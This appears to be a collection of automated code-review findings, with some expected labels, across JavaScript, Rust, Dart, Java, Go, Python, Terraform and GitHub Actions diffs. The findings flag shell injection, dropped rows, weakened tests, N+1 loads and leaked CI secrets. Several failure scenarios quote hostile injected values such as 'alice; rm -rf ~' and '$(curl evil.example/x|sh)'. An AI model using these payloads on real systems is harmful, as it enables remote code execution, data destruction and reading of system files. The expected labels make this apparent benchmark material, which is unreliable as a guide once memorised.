findings.body: `datetime.utcnow()` is deprecated since Python 3.12 and returns a naive datetime (no tzinfo). The previous implementation used `datetime.now(UTC)`, which returns a timezone-aware UTC datetime. Switching to `utcnow()` is both a deprecation warning and a semantic regression: the timestamp is no longer timezone-aware, so any caller that compares it against aware datetimes, serializes it with an explicit offset, or feeds it into libraries that require aware datetimes will misbehave.
findings.failure_scenario: On Python 3.12+ the call emits a DeprecationWarning; at runtime, subtracting this naive timestamp from an aware one raises `TypeError: can't subtract offset-naive and offset-aware datetimes`, and ISO formatting no longer carries a UTC offset.
findings.title: Replace deprecated utcnow() with timezone-aware datetime.now()

findings.body: PurePath(user_id).name returns only the final path component, stripping any directory-like prefix. If user_id values are not bare filenames (e.g. 'org/user-123' or 'users/alice'), the lookup will silently match the wrong row or miss the row entirely. PurePath is also a path utility, not an input validator — using it to 'normalize' an identifier is semantically wrong and platform-dependent (PurePosixPath vs PureWindowsPath).
findings.failure_scenario: A user_id like 'tenant-7/alice' is reduced to 'alice' by PurePath(...).name, so the query SELECTs WHERE id = 'alice' and either returns the wrong user's record or no record at all, depending on whether 'alice' exists as a separate user.
findings.title: PurePath normalization corrupts user_id lookup

findings.body: The new code interpolates `userName` directly into a shell command string passed to `execSync`. Because `execSync` runs the command through a shell by default, any shell metacharacters in `userName` (e.g. `;`, `&&`, `|`, `$()`, backticks) will be interpreted, allowing arbitrary command execution. The previous `spawnSync` call passed arguments as an array, which avoided shell parsing.
findings.failure_scenario: An attacker supplies a userName such as `alice; rm -rf ~` or `$(curl evil.example/x|sh)`. `execSync` invokes a shell that parses the metacharacters and executes the injected command with the privileges of the Node.js process, leading to remote code execution or data destruction.
findings.title: OS command injection via unsanitized userName in shell command

findings.body: The change replaces spawnSync (which takes arguments as an array and bypasses the shell) with execSync invoked on a template-literal string. execSync always runs its argument through /bin/sh, so any shell metacharacters in userName (;, &&, |, $(), backticks, newlines, etc.) are interpreted by the shell. This is a security regression from the prior implementation, which passed userName as a discrete argv element.

findings.body: The original code used repo.loadMany(ids), which is typically chosen precisely because individual items may be missing. The new code calls repo.load(id) per ID and immediately accesses item.active without checking whether item is null or undefined. If repo.load returns null for missing IDs (the common contract for individual load methods, and the likely reason loadMany was used originally), this throws TypeError. Note: the exact return type of repo.load is not visible in this diff, so verify the contract before applying the fix.
findings.failure_scenario: When enrich receives an ID that does not exist in the repository, repo.load returns null, and the expression item.active throws TypeError: Cannot read properties of null, aborting the loop and losing all subsequent results.

findings.body: The new loop calls `repo.load(id)` once per id, replacing the previous single `repo.loadMany(ids)` call. If `load` issues a database query or network request, this turns one round-trip into N round-trips, scaling latency and load with input size.
findings.failure_scenario: When `ids` is large, the function issues one query per id instead of one batched query, increasing latency and exhausting the connection pool.
findings.title: N+1 query: load each id individually instead of batching

findings.body: The spec states "Report commands shall not interpolate input into a shell." The new code builds a shell command string with `userName` interpolated via a template literal and passes it to `execSync`, which always spawns a shell. A malicious or unexpected `userName` (e.g. `alice; cat /etc/passwd` or `$(curl evil.x)`) will be executed by the shell. The previous implementation used `spawnSync` with an argument array, which avoids shell interpolation entirely. To fix, switch to `execFileSync` (or `spawnSync`) with an argument array and update the import accordingly.
findings.failure_scenario: A user with a name like `alice; cat /etc/passwd` or `$(curl evil.x)` causes arbitrary command execution when `renderReport` is called, because the interpolated value is parsed by the shell.
findings.title: Shell injection via interpolated userName contradicts spec

findings.body: `rows.slice(1)` discards the first element of the input array on every call. The previous implementation returned `rows` unchanged, and the original test asserted that exact behaviour. Nothing in the diff explains why the first row should be dropped, and the test was simultaneously weakened to `toBeTruthy()`, so this data loss is not caught by the suite.
findings.failure_scenario: Any caller that passes a non-empty `rows` array loses its first element. For example, `renderReport("alice", ["header", "row1", "row2"])` returns `["row1", "row2"]` instead of the full input, silently corrupting report output.
findings.title: Remove the slice(1) that silently drops the first row

findings.body: The assertion was relaxed from `toEqual(["first", "second"])` to `toBeTruthy()`. `toBeTruthy()` passes for any non-null/non-undefined value, including an empty array, so it no longer verifies the return value at all. This is precisely why the `rows.slice(1)` regression in `report.js` is not caught: the new test would still pass even if the function returned `[]`.
findings.failure_scenario: Any future change that alters, truncates, or replaces the returned array (such as the `slice(1)` introduced in this same diff) goes undetected because the test only checks that *something* truthy is returned.
findings.title: Restore the exact-equality assertion

findings.body: The previous implementation called `repository.loadMany(ids)` once. The new code calls `repository.load(id)` inside a loop, issuing one repository call per id. If `load` is a database query or network request, this turns a single round-trip into N round-trips and scales linearly with input size. The `await` inside the loop also forces sequential execution, so even if per-item calls were required they could run in parallel with `Promise.all`. The simplest fix is to batch-load and filter in memory.
findings.failure_scenario: When `ids` is large, the function issues one repository round-trip per id instead of one batched call, increasing latency and load on the data source proportionally to the input size.
findings.suggestion:
const items = await repository.loadMany(ids);
  return items.filter(item => item.active && item.owner && item.owner.enabled);
findings.title: Restore batch loading to avoid N+1 repository calls

findings.body: If `repository.load(id)` can return null/undefined for missing items, accessing `.active` on it will throw a TypeError, crashing the entire enrichment process. The original `loadMany` call may have handled missing items gracefully (e.g., returning sparse arrays or filtering internally).
findings.failure_scenario: When `repository.load(id)` returns null/undefined for an ID that doesn't exist, `item.active` throws TypeError, causing the entire enrich() call to fail and reject the promise.
findings.title: Guard item before accessing .active

findings.body: The default value `timeoutMs = 30000` was removed, making `timeoutMs` a required positional parameter. Any existing caller that previously omitted this argument received 30000 and will now receive `undefined`, which directly contradicts the stated intent to preserve `fetchUser` compatibility.
findings.failure_scenario: An existing caller invokes `fetchUser(id)` with only one argument; `timeoutMs` becomes undefined and any downstream code that expected a number (or relied on the 30s default) misbehaves.
findings.title: Restore the timeoutMs default parameter

findings.anchor: return [{ id, fetchedAt: new Date().toGMTString() }, timeoutMs];
findings.body: The return value changed from an object `{ id, timeoutMs, fetchedAt }` to a tuple-style array `[{ id, fetchedAt }, timeoutMs]`. Any consumer that previously read properties on the result (e.g. `result.timeoutMs`, `result.fetchedAt`) will now read `undefined`, which is the opposite of what the commit claims to do. The ISO timestamp was also replaced with the deprecated `toGMTString` format.
findings.failure_scenario: A caller accesses `result.timeoutMs` or `result.fetchedAt`; both are undefined on the new array, producing silent failures, NaN propagation, or wrong-format timestamps instead of the previous values.
findings.suggestion: return { id, timeoutMs, fetchedAt: new Date().toISOString() };
findings.title: Restore the original object return shape

findings.body: The `user` parameter is interpolated into a shell command string via `format!` and then handed to `sh -c`. Any shell metacharacters in `user` (`;`, `&&`, `|`, `$(...)`, backticks, redirections, etc.) are interpreted by the shell, turning this into a command-injection sink. The previous version used `Command::args`, which passes arguments without shell interpretation and is the safe form.
findings.failure_scenario: A caller passes a `user` like `alice; rm -rf /` or `$(curl evil.example | sh)`; the shell executes the injected payload with the privileges of the process running `render_report`.
findings.title: Avoid shell interpolation of the user argument

findings.body: Even without metacharacters, spawning `sh -c` to run a single fixed-prefix command is unnecessary and re-introduces shell parsing risks. Pass the program and its arguments as separate argv entries so the OS executes `report` directly with no shell interpretation.
findings.failure_scenario: Future callers or refactors that pass additional user-controlled data into the same string will silently reintroduce command injection; using a shell here normalizes the unsafe pattern.
findings.title: Use execvp-style invocation instead of a shell

findings.body: The commit message claims to "preserve report rows for named users", but `rows.into_iter().skip(1).collect()` discards the first element of every input. The previous implementation returned all rows unchanged; the new one silently drops one, which is the opposite of preservation.
findings.failure_scenario: Any caller passing a non-empty `rows` vector receives a vector with the first element removed, contradicting the stated intent of preserving rows.
findings.title: Remove the skip(1) that drops the first row

findings.body: The new code interpolates `user` directly into a shell command string passed to `sh -c`. A user name containing shell metacharacters (e.g. `; rm -rf ~`, `$(...)`, backticks) will be executed by the shell. The previous version passed the argument via `Command::args`, which is the safe pattern and is exactly what the spec requires ("without a shell").
findings.failure_scenario: An attacker supplies a user name like `alice; curl evil.com/x | sh`. The shell spawned by `sh -c` parses the metacharacter and runs the injected command with the privileges of the process.
findings.title: Shell injection via user-controlled input

findings.body: std::mem::uninitialized() was deprecated in Rust 1.39 because reading from the returned value is undefined behavior. The function creates a UserRecord with completely uninitialized memory and then passes it to UserRecord::merge, which will read those uninitialized bytes. This is immediate UB and a memory-safety hole: the compiler is allowed to assume the value is valid for any type, so subsequent reads can trigger arbitrary behavior, leak stack data, or be exploited. Use std::mem::MaybeUninit instead and only call assume_init() after the value has been fully initialized — for example by constructing the UserRecord directly rather than starting from uninitialized stack memory.
findings.failure_scenario: When fetch_user is called, UserRecord::merge reads fields of the uninitialized UserRecord. The compiler may have assumed those bytes hold a valid UserRecord, so the read is UB; in practice this can leak prior stack contents, crash, or be turned into an arbitrary write by an attacker who controls the surrounding code path.
findings.title: Replace deprecated std::mem::uninitialized() with MaybeUninit

findings.body: The commit message claims the refactor keeps fetch_user source compatible, but the signature changed from `fetch_user(id: &str, timeout_ms: Option<u64>) -> UserRecord` to `fetch_user(id: &str, timeout_ms: u64) -> (UserRecord, u64)`. Every existing caller passing `Option<u64>` or expecting a bare `UserRecord` will fail to compile. The return type also changed from a single record to a tuple, which is a breaking change for every caller.
findings.failure_scenario: Any caller that previously wrote `let user = fetch_user("abc", Some(1000));` or `let user = fetch_user("abc", None);` will no longer compile, because the second argument is now a plain u64 and the return is a tuple. The stated 'source compatible' intent is directly contradicted.

findings.body: The new implementation calls `canonicalize` on both the root and the joined candidate path on every invocation. `canonicalize` resolves symlinks and performs a full path lookup, which is significantly more expensive than the previous `File::open(root.join(name))`. If `open_report` is called frequently (e.g. once per report entry in a loop), this adds two extra filesystem round-trips per call and can dominate runtime on deep or networked filesystems.
findings.failure_scenario: When `open_report` is invoked in a loop over many report names, each iteration now performs two extra `canonicalize` syscalls, scaling the cost linearly with the number of reports and noticeably increasing latency on slow filesystems.
findings.title: Canonicalize on every call adds filesystem syscalls on a hot path

observations.stdout: [{"path": "src/lib.rs", "line": 2, "side": "RIGHT", "severity": "medium", "title": "Canonicalize on every call adds filesystem syscalls on a hot path", "body": "The new implementation calls `canonicalize` on both the root and the joined candidate path on every invocation. `canonicalize` resolves symlinks and performs a full path lookup, which is significantly more expensive than the previous `File::open(root.join(name))`. If `open_report` is called frequently (e.g. once per report entry in a loop), this adds two extra filesystem round-trips per call and can dominate runtime on deep or networked filesystems.", "failure_scenario": "When `open_report` is invoked in a loop over many report names, each iteration now performs two extra `canonicalize` syscalls, scaling the cost linearly with the number of reports and noticeably increasing latency on slow filesystems.", "suggestion": null, "anchor": "    let root = root.canonicalize()?;", "anchored": true, "broad": true, "confidence": 4, "category": "performance"}]

findings.body: The `user` argument is interpolated directly into a string passed to `sh -c`, so any shell metacharacter in `user` (e.g. `; rm -rf ~`, `$(...)`, backticks) is interpreted by the shell. An attacker who controls `user` can execute arbitrary commands with the privileges of the Dart process. Use `Process.run` with an argument vector and no shell so each argument is passed verbatim.
findings.failure_scenario: Calling `renderReport('alice; curl evil.example/x | sh', rows)` causes `sh -c` to execute the injected `curl ... | sh` after the legitimate `report` invocation, leading to remote code execution.
findings.title: OS command injection via shell interpolation of user input

findings.body: The function now returns `rows.sublist(1)`, discarding the first element of the caller's list. If the caller passes a single-row list, this throws `RangeError`; if it passes multiple rows, the first row is silently lost. The previous contract returned the full list. Either preserve the original behavior or document/validate the new contract.
findings.failure_scenario: A caller passing `['only']` triggers `RangeError: 1` from `sublist(1)`; a caller passing `['header', 'a', 'b']` receives only `['a', 'b']` and loses the header row.
findings.title: Drop the first row silently with sublist(1)

findings.anchor: test('returns rows', () async => expect(await renderReport('alice', ['first', 'second']), isNotNull));
findings.body: The previous assertion compared the result to the full input list, which would have caught the `sublist(1)` regression. The new assertion only checks `isNotNull`, so the row-dropping behavior introduced in `renderReport` passes the test. The spec's 'preserve every row' requirement now has no test coverage in this file.
findings.failure_scenario: The `sublist(1)` bug in renderReport ships undetected because the test asserts only that a non-null value is returned, which is true for any list (including the truncated one).
findings.title: Test weakened from exact row equality to isNotNull, no longer guards preservation

findings.body: The spec requires that user names be passed as arguments without a shell. The new code builds a shell command string with the user value interpolated directly into it and runs it via `sh -c`. Any caller-supplied `user` containing shell metacharacters (e.g. `alice; rm -rf /` or `$(curl evil.example/x | sh)`) is executed by the shell. This is both a direct contradiction of the spec's 'without a shell' requirement and a command-injection vulnerability.
findings.failure_scenario: A caller passes user = "alice; curl http://evil.example/pwn | sh"; the interpolated command becomes `report --user alice; curl http://evil.example/pwn | sh`, which the shell executes, giving the attacker arbitrary code execution under the process running the report.
findings.title: Shell interpolation of user input enables command injection and violates 'without a shell' requirement

findings.body: The new implementation awaits `repository.load(id)` once per id inside a `for` loop, so N independent loads run sequentially. The previous implementation delegated to `repository.loadMany(ids)`, which presumably issues them concurrently. This change converts a parallel batch load into a serial one, multiplying wall-clock latency by N.
findings.failure_scenario: When `enrich` is called with a list of many ids, each `repository.load` call blocks the next, so total time grows linearly with the list size instead of being bounded by the slowest single load.
findings.title: Sequential awaits in a loop serialize independent loads

findings.body: dart:html is still supported, but the Dart team has been recommending package:web and dart:js_interop for new web platform code. This import also restricts the library to web-only targets, whereas the previous implementation was platform-agnostic and could run on any Dart platform.
findings.failure_scenario: If this library is intended to run on non-web platforms (mobile, server, CLI), the dart:html import will cause compilation failures. On web, the API surface may shift toward package:web in future SDK releases.
findings.title: Consider package:web instead of dart:html

findings.body: The doc comment /// Fetches one user using the stable map return contract. was removed without replacement. The function is part of the public API and its contract has changed (now returns a record, not a map), so updated documentation reflecting the new contract is needed.
findings.failure_scenario: Callers and maintainers lose context about the function's intended behavior and return contract. The stale 'stable map return contract' wording no longer matches the implementation.
findings.title: Restore documentation for the public function

findings.body: The change applies `toLowerCase()` to `userId` before querying. If the `users` table stores IDs in their original case (e.g., mixed-case identifiers), the normalized query value will not match the stored values, causing `findUser` to return an empty result set for valid users. The `trim()` portion is usually harmless, but the case folding silently changes query semantics in a way that depends on the storage convention of the `id` column, which is not visible in this diff.
findings.failure_scenario: A user with id 'User123' stored in the database is looked up via findUser(db, 'User123'); the query now binds 'user123' instead, so the WHERE clause matches no row and the function returns an empty list instead of the user record.

The `trim()` portion is usually harmless, but the case folding silently changes query semantics in a way that depends on the storage convention of the `id` column, which is not visible in this diff.", "failure_scenario": "A user with id 'User123' stored in the database is looked up via findUser(db, 'User123'); the query now binds 'user123' instead, so the WHERE clause matches no row and the function returns an empty list instead of the user record.", "suggestion": null, "anchor": "  final normalizedId = userId.trim().toLowerCase();", "anchored": true, "broad": false, "confidence": 7, "category": "correctness"}]

findings.body: The new implementation invokes the external command through `/bin/sh -c` with the user name concatenated directly into the shell command string. Any character in `user` that the shell interprets (spaces, `;`, `&`, `|`, `$`, backticks, etc.) becomes an injection vector, allowing arbitrary command execution under the JVM's privileges. The previous `ProcessBuilder` form passed `user` as a discrete argv element and was safe from this class of attack.
findings.failure_scenario: A caller passes a user name such as `alice; rm -rf ~` or `$(curl evil.example/x | sh)`. The shell parses the concatenated string and executes the trailing payload, leading to arbitrary code execution on the host running the service.
findings.title: Command injection via shell concatenation of user input

findings.body: The spec requires that rendering preserve every row, but the new implementation returns `rows.subList(1, rows.size())`, which silently discards the first element of the input list. Any caller relying on the previous behaviour (and on the spec) loses data on every invocation.
findings.failure_scenario: A caller passes a list of report rows such as `["header", "row1", "row2"]`. The service returns `["row1", "row2"]`, dropping the header. Downstream rendering or aggregation silently omits the first row.
findings.title: Rendering drops the first row instead of preserving every row

findings.body: The test was renamed from `preservesRows` to `returnsRows` and the assertion was weakened from `assertEquals(List.of("first", "second"), service.render(...))` to `assertNotNull(service.render(...))`. The new code path returns `rows.subList(1, rows.size())`, which drops the first element. `assertNotNull` passes for any non-null return, so the test no longer guards the contract that `render` returns the supplied rows. A regression that drops, reorders, or corrupts the rows would ship silently.
findings.failure_scenario: If `render` is later changed to return an empty list, a truncated list, or rows in a different order, the test still passes because it only checks for non-null. The original `preservesRows` guarantee is no longer enforced.
findings.title: Test no longer asserts the rows returned by render

findings.body: The loop calls repository.load(id) once per id, replacing the original single repository.loadMany(ids) call. This is a classic N+1 query pattern: the cost scales linearly with the size of ids, and each iteration incurs a separate database round-trip instead of one batched query.
findings.failure_scenario: When ids contains many entries, the method issues one database query per id instead of a single batched query, increasing latency proportionally and potentially exhausting the database connection pool.
findings.title: Replace per-id repository.load with batched loadMany

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The original method returned a User; the new method returns Map.Entry<User, Integer>. Callers expecting a User will fail to compile or, if cast, receive a Map.Entry at runtime. The commit message claims to preserve caller compatibility, but this signature change breaks it.
findings.failure_scenario: Any caller invoking fetch(id, timeoutMs) and using the result as a User will get a ClassCastException or a compile error, breaking the very compatibility the commit claims to preserve.
findings.title: Return type changed from User to Map.Entry<User, Integer>

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: The original code passed timeoutMs into the User constructor (presumably as a timeout field). The new code constructs a User with a GMT date string instead, and returns timeoutMs only as the second half of a Map.Entry. Any caller that relied on the User carrying the timeout now sees a date string in that field.
findings.failure_scenario: A caller reading the timeout off the returned User gets a date string instead of the configured timeout, leading to incorrect timeout behavior downstream.
findings.suggestion:
var user = new User(id, timeoutMs);
    return user;
findings.title: Timeout parameter no longer applied to the User

findings.body: The new code calls userId.trim() without a null check. If find is invoked with a null userId, this throws NullPointerException before the query runs.
findings.failure_scenario: Any caller passing null for userId triggers NullPointerException at userId.trim(), surfacing as a 500 instead of a controlled SQLException.
findings.suggestion:

    statement.setString(1, userId.trim().toLowerCase());
findings.title: NullPointerException when userId is null

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The new code creates a PreparedStatement via db.prepareStatement(...) but never closes it. The original code had the same leak on Statement, but the diff is the right place to fix it. JDBC resources must be closed in a finally block or try-with-resources to avoid leaking statements (and the underlying cursor) on every call.
findings.failure_scenario: Each call to find leaks a PreparedStatement and its ResultSet cursor. Under load the database exhausts its statement/cursor pool and subsequent queries fail or the connection is forcibly closed.
findings.title: PreparedStatement is never closed (resource leak)

Because the value is concatenated into the command line rather than passed as a separate argument, any shell metacharacters in `user` (such as `;`, `&&`, `|`, backticks, or `$()`) are interpreted by the shell. An attacker who controls `user` can execute arbitrary commands on the host.

findings.title: OS command injection via shell concatenation of user input

findings.body: Indexing `rows[1:]` on an empty (or nil) slice is legal in Go and yields an empty slice, but combined with the test's `== nil` check the contract is unclear. More importantly, if any caller passes a single-element slice, the first (and only) element is silently dropped, and the function returns an empty slice where the caller expected one row. The previous behavior returned the input verbatim.
findings.failure_scenario: Render("alice", []string{"only"}) returns [] instead of ["only"], and Render("alice", nil) returns [] instead of nil — both silently lose data the caller passed in.
findings.title: Panics on empty input slice

findings.failure_scenario: A future change that drops, reorders, or corrupts rows will pass this test, allowing silent data loss to ship.

Any user containing shell metacharacters (`;`, `&&`, `|`, `$`, backticks, etc.) will be interpreted by the shell, allowing arbitrary command execution. The spec explicitly requires that report commands pass user names as arguments without a shell, which this change directly violates.
findings.failure_scenario: A caller passes a user name like `alice; rm -rf ~` or `$(curl evil.example/x|sh)`. The shell evaluates the metacharacters and runs the injected command with the privileges of the Go process, leading to arbitrary code execution.

findings.body: The function signature changed from `FetchUser(id string, timeout *time.Duration) User` to `FetchUser(id string, timeout time.Duration) (User, time.Duration)`. The commit message claims to 'preserve FetchUser caller compatibility', but the new signature is incompatible with the old one: the parameter type changed from a pointer to a value, and the return type changed from a single User to a (User, time.Duration) tuple. Any existing caller passing a `*time.Duration` or assigning the result to a single User variable will fail to compile.
findings.failure_scenario: Existing callers compiled against the old signature (passing *time.Duration and assigning the result to a User) will fail to compile after this change, directly contradicting the stated intent of preserving caller compatibility.
findings.title: Signature change breaks caller compatibility

findings.body: Switching the trigger from `pull_request` to `pull_request_target` runs the workflow with write permissions and access to repository secrets, but checking out `github.event.pull_request.head.sha` brings untrusted PR code into that privileged context. An attacker who opens a PR can modify `package.json` (or any file executed by `npm test`) to read `process.env.RELEASE_TOKEN` and exfiltrate it via the network, a post to a webhook, or a file in the repo. The previous `pull_request` trigger ran the workflow in the PR's fork context with read-only secrets, which is the safe pattern for forks.
findings.failure_scenario: Attacker opens a PR whose `npm test` script (or any code reached by it) reads `process.env.RELEASE_TOKEN` and posts it to an attacker-controlled server, leaking the secret.
findings.title: pull_request_target with checkout of PR head enables code execution on secrets

findings.body: With the trigger changed to `pull_request_target` and the PR head checked out, the `RELEASE_TOKEN` secret is now injected into the environment of a step that runs attacker-controlled code from the PR. Any script reachable from `npm test` (including `preinstall`/`postinstall` lifecycle hooks, transitive dependencies, or test setup files) can read `process.env.RELEASE_TOKEN` and exfiltrate it. Secrets should never be exposed to PR-triggered workflows that execute code from the PR.
findings.failure_scenario: An attacker submits a PR with a malicious `preinstall` script or test fixture that reads `process.env.RELEASE_TOKEN` and sends it to an external host, leaking the token.
findings.title: Expose RELEASE_TOKEN to untrusted PR code

findings.body: Checking out `github.event.pull_request.head.sha` and then running `npm test` with `RELEASE_TOKEN` in the environment means untrusted PR code runs with a secret in scope. Even if the workflow file itself is trusted (because `pull_request_target` runs from base), the checked-out tree contains attacker-controlled `package.json` and test scripts that can read the env var.
findings.failure_scenario: A malicious PR modifies test scripts or postinstall hooks. When the workflow runs, those scripts read `process.env.RELEASE_TOKEN` and exfiltrate it, giving the attacker the ability to publish releases.
findings.suggestion:
- uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          persist-credentials: false
findings.title: Checkout of PR head with secrets in env is unsafe

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The ingress rule for SSH (port 22/tcp) now allows connections from 0.0.0.0/0, exposing the instance to brute-force, credential-stuffing, and exploitation of any SSH vulnerability from any source on the internet. The previous CIDR (10.20.0.0/16) was a private range; the new one is the entire IPv4 internet. Restrict the source to known bastion/jump-host subnets, a VPN range, or use AWS Session Manager / SSM instead of exposing SSH publicly.
findings.failure_scenario: An attacker on the internet can connect to port 22 on any instance in this security group, attempt credential brute-force, exploit SSH implementation bugs, or pivot into the VPC once a foothold is gained.
findings.title: SSH (port 22) opened to the entire internet

expected.label: SSH ingress is open to the internet

findings.body: The validation only checks that the value is not exactly the string "0.0.0.0/0". It does not verify the input is a well-formed CIDR block, so any non-empty string (e.g. "not-a-cidr", "10.20.0.0", or a typo like "10.20.0.0/33") passes validation and then fails at apply time with a less helpful provider error. A `can(cidrnetmask(...))` check would catch malformed input early with a clear message and still reject the public-internet case.
findings.failure_scenario: An operator passes a malformed value such as "10.20.0.0/33" or "office-vpn" to var.admin_cidr. The validation passes because the string is not literally "0.0.0.0/0", but `terraform apply` then aborts with an opaque CIDR parsing error from the AWS provider instead of the intended, user-facing validation message.

findings.body: The new code builds a shell command string by interpolating user_name directly into it and then runs it with shell=True. Any shell metacharacter in user_name (e.g. '; rm -rf ~', '$(curl ...)', '`...`', '&&', '|') is interpreted by /bin/sh, giving the caller arbitrary command execution as the process user.
findings.failure_scenario: An attacker supplies user_name like 'alice; curl http://evil/x.sh | sh' or '$(malicious)'; subprocess.run invokes /bin/sh -c on the resulting string and executes the injected payload with the privileges of the report process.
findings.title: OS command injection via shell=True with user input

findings.body: The new code interpolates user_name into a shell command string and runs it with shell=True. A user_name containing shell metacharacters (e.g. `; rm -rf /`, `$(curl ...)`) is executed by the shell, allowing arbitrary command execution on the host. The original implementation used the list form, which was safe.
findings.failure_scenario: An attacker who controls user_name passes `alice; cat /etc/passwd`; the shell executes `report --user alice; cat /etc/passwd`, leaking system files or running arbitrary commands as the host user.
findings.title: Avoid shell=True with f-string interpolation of user input

findings.body: The original implementation returned the full rows list. Slicing with rows[1:] silently drops the first element of every report, contradicting the PR's stated intent to preserve report behavior.
findings.failure_scenario: Any caller passing more than one row now receives a list missing its first element; reports that begin with a header or any leading item will be silently truncated, with no warning.
findings.title: Return rows in full; do not drop the first element

findings.body: The previous test asserted that render_report returned the input rows unchanged. The new test only checks that the return value is not None, which is true even when rows[1:] drops data or when the function returns an empty list. The behavioural regression introduced by rows[1:] is therefore undetected.
findings.failure_scenario: If render_report is changed to return [] or to drop arbitrary elements, the test still passes because [] is not None, allowing silent data loss to ship.
findings.title: Test no longer covers the rows contract

findings.body: The previous assertion compared the returned list to the input list, verifying exact preservation. The new assertion only checks that the result is not None, which silently passes whether rows are preserved, dropped, or replaced — directly contradicting the PR's stated intent to preserve report behavior. The accompanying rename from `test_render_report_preserves_rows` to `test_render_report_returns_a_value` reinforces this reversal.
findings.failure_scenario: A future change that returns None, an empty list, or `rows[1:]` will all pass the new test; the regression introduced by this PR (the rows[1:] change) is no longer caught.
findings.title: Test no longer enforces preservation of rows

findings.body: The previous implementation called `repository.load_many(item_ids)` once, but the new code calls `repository.load(item_id)` inside the loop. If `load` issues a database query or network request, this turns a single batched call into N round-trips, scaling linearly with input size.
findings.failure_scenario: When `item_ids` is large, the function issues one repository call per id instead of one batched call, increasing latency and potentially exhausting connection pools.
findings.title: Restore batched load to avoid N+1 queries

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The function now returns (dict, timeout) as a tuple. The caller already knows what timeout value they passed in, so returning it provides no information. This adds complexity to the API for no benefit and forces all callers to unpack a tuple instead of using the dict directly.
findings.suggestion:
def fetch_user(user_id: str, timeout: int) -> dict[str, object]:
    return {"id": user_id, "fetched_at": datetime.utcnow()}
findings.title: Returning the timeout parameter back to the caller is needless

findings.body: PurePath(user_id).name treats the user_id as a filesystem path and returns the final path component. This silently changes the value being looked up: PurePath('users/alice').name returns 'alice', PurePath('../admin').name returns 'admin', and PurePath('/foo').name returns 'foo'. A lookup for user 'users/alice' would actually find user 'alice', returning the wrong row or no row at all. PurePath is a filesystem API and is not appropriate for normalizing user identifiers. If path-like prefixes need to be stripped, that should be done explicitly with validation, not by treating the ID as a path. Note: the `from pathlib import PurePath` import added on line 1 becomes unused once this normalization is removed.
findings.failure_scenario: When find_user is called with a user_id containing a path separator (e.g., 'users/alice'), PurePath strips everything before the last separator, so the query looks up 'alice' instead of 'users/alice'. This returns the wrong user record or no record, causing incorrect authorization decisions or failed lookups.

findings.body: The new code interpolates `userName` directly into a shell command string passed to `execSync`. Because `execSync` runs the command through a shell by default, any shell metacharacters in `userName` (e.g. `;`, `&&`, `|`, `$()`, backticks) will be interpreted by the shell, allowing arbitrary command execution. The previous `spawnSync` call passed arguments as an array, which avoided shell interpretation. The fix is to pass the arguments as an array (and use `spawnSync` or `execFileSync`) so the user input is treated as a single argument, not as shell syntax.
findings.failure_scenario: An attacker supplies a `userName` such as `alice; rm -rf /` or `$(curl evil.example/x|sh)`. The shell evaluates the metacharacters and executes the injected command with the privileges of the Node.js process, leading to remote code execution, data exfiltration, or destruction.
findings.title: OS command injection via unescaped user input in shell command

findings.body: The spec requires report commands to avoid shell interpretation. The previous implementation used `spawnSync` with an argument array, which bypasses the shell. The new code uses `execSync` with a template string, which runs through `/bin/sh -c` by default — the exact behaviour the spec forbids. It also enables command injection: a `userName` containing shell metacharacters (e.g. `x; rm -rf ~`) would be executed by the shell.
findings.failure_scenario: Calling `renderReport("x; touch /tmp/pwned", ["a"])` causes the shell to execute `touch /tmp/pwned` as a side effect, because `userName` is interpolated into a string passed to `execSync`.
findings.title: execSync reintroduces shell interpretation, contradicting the spec

findings.body: The test previously asserted that `renderReport` returned the exact rows it was given. It now only asserts that the return value is defined, which would pass even if the function returned `undefined`, an empty array, or arbitrary garbage. Combined with the production change to `return rows.slice(1)`, the test no longer catches the new behavior (dropping the first row) or any future regression. Restore a value-based assertion that matches the intended contract.
findings.failure_scenario: If `renderReport` is later changed to return the wrong rows, drop rows, or return `undefined`, the test still passes and the regression ships to production undetected.
findings.title: Test weakened from value check to existence check

findings.body: The function now returns rows.slice(1), which discards the first element of the input array. The previous implementation returned the full rows array unchanged. This silently drops data and contradicts the function's name and signature (returning string[] from string[]).
findings.failure_scenario: Any caller relying on the full list of rows will receive a list missing its first element, causing data loss in reports.

findings.body: The new implementation calls `repo.load(id)` once per id inside a loop, replacing the previous single `repo.loadMany(ids)` call. This turns one batched repository call into N individual calls, which is a classic N+1 pattern: latency and load on the data source now scale linearly with the size of `ids`. The original `loadMany` already existed on the repository and was being used; reverting to it (with the active/owner/enabled filtering applied to the returned items) restores the batched behaviour.
findings.failure_scenario: When `ids` is large, the function issues one repository round-trip per id instead of one batched call, increasing end-to-end latency and putting unnecessary load on the underlying data source.
findings.suggestion: return repo.loadMany(ids).then(items => items.filter(i => i.active && i.owner && i.owner.enabled));
findings.title: Replace per-id load loop with batched loadMany

findings.body: userName is interpolated directly into a shell command string passed to execSync. execSync runs the string through the shell when given a single string argument, so any shell metacharacters in userName (e.g. `; rm -rf ~`, `$(...)`, backticks) are interpreted by the shell. The previous code used spawnSync with an argument array, which avoided the shell entirely. The change both regresses security and contradicts the stated intent of keeping output 'stable for named users' — a shell-injection vulnerability is not a stability improvement.
findings.failure_scenario: Calling renderReport('alice; cat /etc/passwd', rows) causes the shell to execute `cat /etc/passwd` (and any other injected command) with the privileges of the Node process, because execSync receives the concatenated string and hands it to /bin/sh.
findings.title: Command injection via unsanitised userName

findings.body: The function now returns rows.slice(1), discarding the first element. The previous behaviour returned the full rows array, and the test was relaxed from toEqual([...]) to toBeTruthy() to mask this change. There is no stated reason in the commit message to drop the first row; the intent says 'keep report output stable', which is the opposite of silently removing data.
findings.failure_scenario: Any caller passing a non-empty rows array loses its first element, and an empty array causes rows.slice(1) to return [] rather than the original []. The relaxed test no longer catches this regression.
findings.title: rows.slice(1) drops the first row

findings.body: The test was changed from a specific equality check (`toEqual(["first", "second"])`) to a generic `toBeTruthy()`. The new implementation returns `rows.slice(1)`, which for the input `["first", "second"]` produces `["second"]`. The `toBeTruthy()` assertion passes for both the old and new behavior, so a regression in the slicing logic would not be caught. The test name was also changed from "preserves all rows" to the vague "returns rows", which no longer describes the actual behavior under test.
